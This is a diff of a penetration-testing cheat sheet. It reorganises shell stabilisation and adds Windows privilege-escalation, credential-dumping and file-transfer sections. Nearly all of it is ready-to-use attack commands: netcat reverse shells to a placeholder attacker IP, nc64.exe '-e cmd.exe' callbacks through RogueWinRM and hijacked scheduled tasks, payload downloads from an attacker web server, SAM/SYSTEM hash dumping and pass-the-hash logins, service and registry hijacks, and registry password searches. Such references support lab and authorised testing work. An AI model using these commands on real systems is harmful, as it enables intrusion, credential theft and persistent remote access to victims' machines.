@@ -32,6 +32,7 @@
 * [Msfvenom](#msfvenom)
 * [Powershell one-liner](#powershell-one-liner)
 * [PHP Webshell one-liner](#php-webshell-one-liner)
+* [Shell Stabilisation](#shell-stabilisation)
 
 **5. [Linux Privilege Escalation](#5-linux-privilege-escalation)**
 
@@ -46,7 +47,7 @@
 
 **8. [Exfiltration](#8-exfiltration)**
 
-* [Server](#server)
+* [File Transfer](#file-transfer)
 
 **9. [Persistence](#9-persistence)**
 
@@ -363,43 +364,12 @@ Bind Shell:
 
     A: nc <local_ip> <port_number>
 ```
-Shell Stabilisation:
-
-    1. Python (sometimes need to specify python version in first cmd)
-        python -c 'import pty;pty.spawn("/bin/bash")'
-        export TERM=xterm
-        Ctrl + Z
-        stty raw -echo; fg
-
-    2. Rlwrap
-        install rlwrap first on your kali:
-        sudo apt install rlwrap
-
-        invoke this listener:
-            rlwrap nc -lnvp <port_number>
-            CTRL + Z
-            stty raw -echo; fg
-
-    3. Socat
-        1. Start Webserver on attacker machine(with Socat installed) in the directory of the binary.
-            sudo python -m http.server <port>
-        2. Use the Netcat reverse shell to download Socat.
-            Linux: wget <attack_ip>/socat -o /tmp/socat
-            Powershell: Invoke-WebRequest -uri <attack_ip>/socat.exe -outfile C:\\Windows\temp\socat.exe 
-        3. Check permissions and execute socat.
-    
-    General Adjustments:
-        open terminal on own machine and use 'stty -a'
-        check in the output the values for rows and columns
-        use 'stty rows <number>' and 'stty cols <number>' on rev/bind shell
-
 Other things:
 ```
     Listener: mkfifo /tmp/f; nc -lvnp <port> < /tmp/F | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 
     Rev-Shell: mkfifo /tmp/f; nc <attack_ip> <port> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f 
 ```
-
 ### Socat:
 
 Reverse Shell (normal):
@@ -518,6 +488,43 @@ powershell -c “$client = New-Object System.Net.Sockets.TCPClient(‘<ip>’,<p
 ```
 
 need to trigger rev-shell -> find upload folder -> add to url-path `http://<ip>/<path>/php_shell.php?cmd=<rev_shell>`
+
+### Shell Stabilisation:
+
+    1. Python (sometimes need to specify python version in first cmd)
+        python -c 'import pty;pty.spawn("/bin/bash")'
+        export TERM=xterm
+        Ctrl + Z
+        stty raw -echo; fg
+
+    2. Rlwrap
+        install rlwrap first on your kali:
+        sudo apt install rlwrap
+
+        invoke this listener:
+            rlwrap nc -lnvp <port_number>
+            CTRL + Z
+            stty raw -echo; fg
+
+    3. Socat
+        1. Start Webserver on attacker machine(with Socat installed) in the directory of the binary.
+            sudo python -m http.server <port>
+        2. Use the Netcat reverse shell to download Socat.
+            Linux: wget <attack_ip>/socat -o /tmp/socat
+            Powershell: Invoke-WebRequest -uri <attack_ip>/socat.exe -outfile C:\\Windows\temp\socat.exe 
+        3. Check permissions and execute socat.
+
+    4. /usr/bin/scripts
+        /usr/bin/script -qc /bin/bash /dev/null
+        export TERM=xterm
+        Ctrl + Z
+        stty raw -echo; fg
+    
+
+    General Adjustments:
+        open terminal on own machine and use 'stty -a'
+        check in the output the values for rows and columns
+        use 'stty rows <number>' and 'stty cols <number>' on rev/bind shell
 
 ## 5. Linux Privilege Escalation:
 
@@ -702,9 +709,48 @@ T:  execute
     Before use run `wes.py --update` to update database and run `systeminfo > systeminfo.txt` on target system.
     Then WES-NG can be used with `wes.py systeminfo.txt`.
 
-4. Metasploit
+4. [PowerUp.ps1](https://gist.github.com/rvrsh3ll/005cd3ab80033312ffdca862d0b337fd)
+    
+    ```powershell
+    . .\PowerUp.ps1
+    Invoke-AllChecks
+    ```
+
+5. Metasploit
     
     Use the `multi/recon/local_exploit_suggester` module.
+
+### Windows Login Options:
+
+```
+normal login:
+    xfreerdp /u:<username> /p:<password> /v:<windows_ip> +clipboard
+    rdesktop <IP>
+    winexe -U '<username>%<password>' //<IP> cmd.exe
+
+pass-the-hash login:
+    pth-winexe -U '<username>%<LM_hash:NTLM_hash>' //<IP> cmd.exe    
+```
+
+### Windows Hash  & Cracking Options:
+```
+Copy of SAM/SYSTEM (backup if available also nice):
+reg.exe save hklm\sam SAM
+reg.exe save hklm\system SYSTEM
+
+Dumping:
+    1. impacket (best) 
+    python /usr/share/doc/python3-impacket/examples/secretsdump.py -system SYSTEM -sam SAM LOCAL
+
+    2. creddump.py
+    git clone https://github.com/Tib3rius/creddump7
+    pip3 install pycrypto
+    python3 creddump7/pwdump.py SYSTEM SAM
+
+    3. John  
+    samdump2 SYSTEM SAM
+```
+
 
 ### manual Enumeration:
 
@@ -737,39 +783,91 @@ T:  execute
 
     `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`
 
-#### Scheduled Tasks:
-    Overview: schtasks
-    Detailed view: schtasks /query /tn <task_name> /fo list /v
-    Check if executable can be modifyed by us: icasl <executable-path>
-    Modify Task: echo c:\tools\nc64.exe -e cmd.exe <attacker_ip> <port> > <old_executable_path>
-    Run task immediately: schtasks /run /tn <task_name>
+6. Windows Privileges:
+    
+    `whoami /priv`
 
-#### Windows Services:
-    List Services:
+    After fake RogueWinRM service is running:
+
+    `c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"`
+
+### Insecure Configurations:
+
+1. Windows Services:
+    ```
+    in Powershell replace sc with sc.exe
+
+    List services:
         services.msc
         cmd.exe:    sc queryex type= service state= all
         Powershell: Get-Service
-    View details:   sc qc <service_name>
-    Check permissions: icals <executable_path>
-    Start/Stop Service: sc start/stop <service>
+    View details:   
+        sc qc <service_name>
+    Check permissions: 
+        icals <executable_path>
+        accesschk.exe /accepteula -uwcqv <username> <service>
+    Start/Stop service: 
+        sc start/stop <service>
+        net start/stop <service>
 
     insecure service permissions:
         icacls <executable path(rev-shell)> /grant Everyone:F
-        sc config <service> binPath= "<executable path(rev-shell)>" obj= LocalSystem
+        sc config <service> binPath= "\"C:\<rev_shell_path>\"" obj= LocalSystem
 
-    in Powershell replace sc with sc.exe
+    unquoted service path:
+        accesschk.exe /accepteula -uwdq "C:\Program Files\<unqouted_path_service>"
+            -> look for write access of BUILTIN\Users
+        copy C:\<path_reverse_shell> "C:\Program Files\<unquoted_path_service_exe>"
 
-#### Windows Privileges:
+    weak registry permissions:
+        accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<service>
+            -> look for write access of NT AUTHORITY\INTERACTIVE
+        reg add HKLM\SYSTEM\CurrentControlSet\services\<service> /v ImagePath /t REG_EXPAND_SZ /d C:\<rev_shell_path> /f
 
-`whoami /priv`
+    insecure service executables:
+        accesschk.exe /accepteula -quvw "C:\Program Files\<service_binary_path_exe>"
+            -> look for entry at SERVICE_START_NAME and if BINARY_PATH_NAME is writable
+         copy C:\<path_reverse_shell> "C:\Program Files\<unquoted_path_service_exe>" /Y
+            -> /Y for quit installation with no interactive part
+    ```
+2. Registry:
+    ```
+    AlwaysInstallElevated:
+    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+        -> if values are set to 0x1 then create reverse.msi with msfvenom
+        -> run with msiexec /quiet /qn /i <reverse.msi>
 
-After fake RogueWinRM service is running:
+    Autoruns:
+    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+        -> query for autorun executables
+    accesschk.exe /accepteula -wvu "C:\Program Files\<autorun_program_name_exe_path>"
+        -> look if autorun executable is writable
+    copy C:\<path_reverse_shell> "C:\Program Files\<unquoted_path_service_exe>" /Y
+            -> /Y for quit installation with no interactive part
+            
+    Passwords:
+    reg query HKLM /f password /t REG_SZ /s
+    reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+    ```
 
-`c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"`
+3. Scheduled Tasks:
+    ```
+    Overview: 
+        schtasks
+    Detailed view: 
+        schtasks /query /tn <task_name> /fo list /v
+    Check if executable can be modifyed by us: 
+        icasl <executable-path>
+    Modify Task: 
+        echo c:\tools\nc64.exe -e cmd.exe <attacker_ip> <port> > <old_executable_path>
+    Run task immediately: 
+        schtasks /run /tn <task_name>
+    ```
 
-#### unpatched Software:
+4. unpatched Software:
 
-`wmic product get name,version,vendor`
+    `wmic product get name,version,vendor`
 
 ## 7. Password/Hash Cracking:
 
@@ -851,7 +949,7 @@ hydra -l <username> -P <wordlist.txt> <server> <service>
 
 ## 8. Exfiltration:
 
-### Server:
+### File Transfer:
 
 SCP:
 ```
@@ -861,6 +959,24 @@ copy file from remote server to local host: scp <ip>:<remote_file_path> <local_s
 
 copy directory: scp -r <directory> <username>@<ip>:<path_to_remote_directory>
 ```
+
+python (Server):
+```
+Webserver: python -m http.server -p <port>
+
+SMB-Server via impacket: 
+        sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+        copy \\<IP>\kali\<file> <dest_path_on_windows>
+```
+
+powershell (Download):
+```powershell
+powershell -c "wget <url>" -outfile "<name>"
+
+copy C:\<file_path> \\<IP\<kali_directory>\
+```
+
+
 ## 9. Persistence:
 
 ### Windows:
